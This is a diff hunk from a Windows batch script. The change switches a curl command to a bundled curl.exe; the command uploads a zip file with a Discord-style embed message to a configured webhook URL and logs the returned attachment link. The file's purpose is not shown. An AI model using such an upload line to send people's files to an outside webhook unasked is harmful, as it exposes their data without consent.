@@ -91,7 +91,7 @@ TIMEOUT /T 5 /NOBREAK >NUL
 
 SET temp=temp.json
 SET MESSAGE=%EMBED_MESSAGE% %HH%:%Min%:%Sec%, %DD%/%MM%/%YYYY%
-curl -H "Content-Type: multipart/form-data" -F "payload_json={\"embeds\":[{\"title\": \"%EMBED_TITLE%\",\"description\": \"%MESSAGE%\",\"color\": %EMBED_COLOR%}], \"username\": \"%AVATAR_NAME%\", \"avatar_url\": \"%AVATAR_URL%\"}" -F "file=@%zip_file%" "%WEBHOOK_URL%" > %temp%
+.\lib\curl.exe -H "Content-Type: multipart/form-data" -F "payload_json={\"embeds\":[{\"title\": \"%EMBED_TITLE%\",\"description\": \"%MESSAGE%\",\"color\": %EMBED_COLOR%}], \"username\": \"%AVATAR_NAME%\", \"avatar_url\": \"%AVATAR_URL%\"}" -F "file=@%zip_file%" "%WEBHOOK_URL%" > %temp%
 FOR /F "tokens=*" %%i in ('type %temp% ^| .\lib\jq.exe -r ".attachments[].url"') do SET cdn_link=%%i
 ECHO %cdn_link% >> logs.txt
 CLS
